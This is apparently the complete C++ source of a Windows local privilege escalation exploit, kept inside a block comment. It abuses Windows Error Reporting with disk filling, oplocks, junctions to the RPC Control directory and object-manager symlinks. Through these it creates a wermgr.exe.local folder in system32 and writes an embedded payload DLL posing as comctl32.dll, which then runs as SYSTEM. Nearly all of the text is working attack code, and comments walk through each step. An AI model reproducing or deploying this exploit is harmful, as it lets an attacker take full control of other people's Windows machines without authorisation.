/*
#include "resource.h" 
 
#include <exploitLib/exploitLib.h>

#include "exploitLib/primitives.h" 
#include <exploitLib/misc.h>
#include <exploitLib/IPC/WER.h>
#include <exploitlib/ipc/misc.h>

#include <exploitlib/ipc/datasharingservice.h>
  

void removeWERContent()
{
   //First we clear %ALLUSERSPROFILE%\\Microsoft\\windows\\wer so it can become a mount point.
   //By moving the subfolders to another directory we bypass any missing DELETE permissions in temp files/reports
   auto werDir = x::file{ "%ALLUSERSPROFILE%\\Microsoft\\windows\\wer"_p,
                           FILE_LIST_DIRECTORY,
                           FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_SYNCHRONOUS_IO_NONALERT
   };

   for (auto& f : werDir.enumDir()   )
   {

      try {
         x::file{ x::strpath{ werDir } / x::strpath(f) , DELETE }.rename("%TEMP%"_p / x::strpath{ x::guid::random_guid() });
      }
      catch (wil::ResultException & e)
      {
         std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
         std::wcout << e.what() << std::endl;
      }
      catch (std::exception & e)
      {
         std::wcout << e.what() << std::endl;
      }
   }

}

auto getFreeSpace()
{
   unsigned __int64 i64FreeBytesToCaller, i64TotalBytes, i64FreeBytes;

   THROW_LAST_ERROR_IF(
      ! 
      GetDiskFreeSpaceEx( 
         "%HOMEDRIVE%"_p,
         (PULARGE_INTEGER)&i64FreeBytesToCaller,
         (PULARGE_INTEGER)&i64TotalBytes,
         (PULARGE_INTEGER)&i64FreeBytes
      ) 
   );
   return i64FreeBytesToCaller / (1024 * 1024);
}
 
auto getChunkSize()
{
   return (1024 * 1024) * (getFreeSpace() / 100);
}


#define CVALUE_FIRST 0xfffabbcc
#define CKEY_FIRST 0x1030341
#define CKEY_SECOND 0x132E46

static ULONG_PTR completionKey;
static IO_STATUS_BLOCK ioSb;
static ULONG_PTR completionValue; 

//x::regKey{ "\\registry\\MACHINE\\SOFTWARE\\Microsoft\\Provisioning\\Diagnostics\\AutoPilot\\a",0,DELETE }.deleteKey();
//x::regLinkKey{ "\\registry\\MACHINE\\SOFTWARE\\Microsoft\\Provisioning\\Diagnostics\\AutoPilot\\a" ,true }.setLinkDestination("\\registry\\MACHINE");

int main(int, char* args[])
try
{    
   
    //First empty WER folder- so it can get deleted
   removeWERContent();
   
   x::file delmeDir{ "%windir%\\temp\\aEvilDir"_p ,     FILE_WRITE_ATTRIBUTES, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT };
   try {
      delmeDir.delete_reparse_point();
      
   }
   catch (...) {}
   x::file delmeFile{ "%windir%\\temp\\aEvilDir\\file"_p  ,     DELETE|FILE_GENERIC_READ| FILE_GENERIC_WRITE  };
   delmeFile.setTimeToOld();

   x::file stopmeDir{ "%windir%\\temp\\bEvilDir"_p  ,     FILE_WRITE_ATTRIBUTES, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT };
   x::file stopmeFile{ x::strpath{ stopmeDir} / "file"_p ,    DELETE | FILE_GENERIC_READ | FILE_GENERIC_WRITE };;
   stopmeFile.setTimeToOld();

   x::symlink link( L"\\RPC Control\\file", L"\\??\\%ALLUSERSPROFILE%\\Microsoft\\windows\\wer::$index_allocation" );

   delmeFile.makeoplock(
      std::function< bool(x::ack<x::file>) >{
      [&](x::ack<x::file> file)
      {
         delmeFile.rename("\\??\\%TEMP%"_p / x::guid::random_guid());

         delmeDir.makeJunction(L"\\RPC Control");
         return false;
      }
   });
   // This oplock will stop storage service from recreating WER dir
   stopmeFile.makeoplock(
      std::function< bool(x::ack<x::file>) >{
      [&](x::ack<x::file> file) {
         Sleep(INFINITE);
         return false;
      }
   });
   std::fstream filler{ "%TEMP%\\filler"_p, std::fstream::in | std::fstream::out | std::fstream::app };
   
   auto chunkSize = getChunkSize();
 
   static std::string fill{ };
   fill.resize(chunkSize, 'x' );


  
   bool canWriteAttributes = false;
   while ( canWriteAttributes == false )
   {
      if (getFreeSpace() >= 2500)
      {
         filler.write(fill.c_str(), chunkSize);
      }
      else
      {
         if (filler.is_open())
            filler.close();
         for (int y = 0; y < 10; y++)
         {
   //        TriggerStorageCleanup();
         }
         Sleep(6000);
      }
      Sleep(1000);
      try
      {
         x::file{ "%ALLUSERSPROFILE%\\Microsoft\\windows\\wer"_p, FILE_READ_ATTRIBUTES, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, FILE_OPEN };
      }
      catch (...)
      {
         Sleep(1000);

         std::wcout << L"WER directory is deleted, triggering WER to recreate" << std::endl;
         try { submitBlankReport();      Sleep(5000);   }
         catch (...) {}
      }
      try
      {
         x::file{ "%ALLUSERSPROFILE%\\Microsoft\\windows\\wer"_p, FILE_WRITE_ATTRIBUTES, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, FILE_OPEN };
         canWriteAttributes = true;
      }
      catch (...) { std::wcout << L"Waiting for WER directory to be writeable" << std::endl;  }
     
    
   }
   if(filler.is_open())
   filler.close();

   std::wcout << L"Now WER is recreated, empty dir again so it can can become mount point" << std::endl;

   removeWERContent();

   //%ALLUSERSPROFILE%\\Microsoft\\windows\\wer should be empty, a junction point it will become
   try {
      x::file{ "%ALLUSERSPROFILE%\\Microsoft\\windows\\wer"_p, 
               FILE_WRITE_ATTRIBUTES,
               FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT 
      }.makeJunction( "\\RPC Control"_p );
   }
   catch (...) {} //If we fail try continueing, maybe it is already a junction but something else make it fail

   //Create the needed links for an error report to be processed
   x::symlink reportArchive{      "\\RPC Control\\ReportArchive",       "\\??\\C:\\windows\\system32\\wermgr.exe.local"_p };
   x::symlink localReportArchive{ "\\RPC Control\\LocalReportArchive",  "\\??\\C:\\windows\\system32\\wermgr.exe.local"_p };
   x::symlink temp{               "\\RPC Control\\temp",                "\\??\\C:\\windows\\system32\\wermgr.exe.local"_p };
   x::symlink reportQueue{        "\\RPC Control\\ReportQueue",         "\\??\\C:\\windows\\system32\\wermgr.exe.local"_p };
    
   //Make the service create the directory in system32 
   try{
      submitBlankReport();
   }
   catch (...) {}
   
   //Now the directory exists and we have write permissions to it, create the subdirectory where .local redirection will look in for comctl32.dll
   x::file commonControl{ "%WINDIR%\\system32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8"_p , 
                          FILE_GENERIC_WRITE, 
                          FILE_DIRECTORY_FILE 
                        };

   //Now write the embedded payload dll that will get executed as SYSTEM
   x::file{ x::strpath{ commonControl } / "comctl32.dll"_p , FILE_GENERIC_WRITE ,FILE_SYNCHRONOUS_IO_NONALERT }.writedata(x::getPayload< EMBEDDED_PAYLOAD>());

   //Restore normal location for report data
   try {
      x::file{ "%ALLUSERSPROFILE%\\Microsoft\\windows\\wer"_p, FILE_WRITE_ATTRIBUTES, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT }.delete_reparse_point();
   }
   catch (...) {}

   //Submit again, now the created files and folders will be used, giving us elavation of privilegie
   submitBlankReport();
   
   return 0;
}
catch ( wil::ResultException& e )
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}  
catch ( std::exception &e )
{
   std::wcout << e.what() << std::endl;
} 
 */